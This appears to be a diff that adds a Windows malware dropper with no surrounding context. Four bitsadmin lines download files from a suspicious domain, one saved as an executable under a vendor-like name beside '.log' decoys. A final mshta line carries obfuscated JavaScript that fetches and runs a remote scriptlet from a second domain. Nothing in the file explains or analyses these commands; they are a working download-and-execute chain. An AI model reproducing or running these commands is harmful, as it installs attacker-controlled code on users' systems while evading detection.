@@ -1,0 +1,11 @@
+"C:\Windows\System32\bitsadmin.exe" /transfer 55200802903 /priority foreground http://brutungunpor.shedsexpress.one/?36994325157613925 "C:\ProgramDataTemp27208499783\dump.log"
+
+
+"C:\Windows\System32\bitsadmin.exe" /transfer 55200802903 /priority foreground http://brutungunpor.shedsexpress.one/?66761057576693659 "C:\ProgramDataTemp27208499783\sdk.log"
+
+"C:\Windows\System32\bitsadmin.exe" /transfer 55200802903 /priority foreground http://brutungunpor.shedsexpress.one/?49839001790632930 "C:\ProgramDataTemp27208499783\Sennheiser.Inspiron.04039.7636.464.log"
+
+"C:\Windows\System32\bitsadmin.exe" /transfer 55200802903 /priority foreground http://brutungunpor.shedsexpress.one/?74612880136628750 "C:\ProgramDataTemp27208499783\Sennheiser.Inspiron.04039.7636.464.exe"
+
+
+MshtA "JaVAsCrIpT:var _$_VTTR=["\x4e\x56\x4c\x43\x5a\x5a\x34","\x73\x63\162\x69\x70\x74\72\x48\x54\x74\160\x73\x3a\x2f\x2f\x65\x39\147\x34\67\146\141\x38\153\x2e\146\x61\x63\x6f\x70\x65\154\56\x70\x72\x65\x73\163\x2f\x3f\62\57"];try{GetObject(_$_VTTR[1])[_$_VTTR[0]]()}catch(e){};close()"
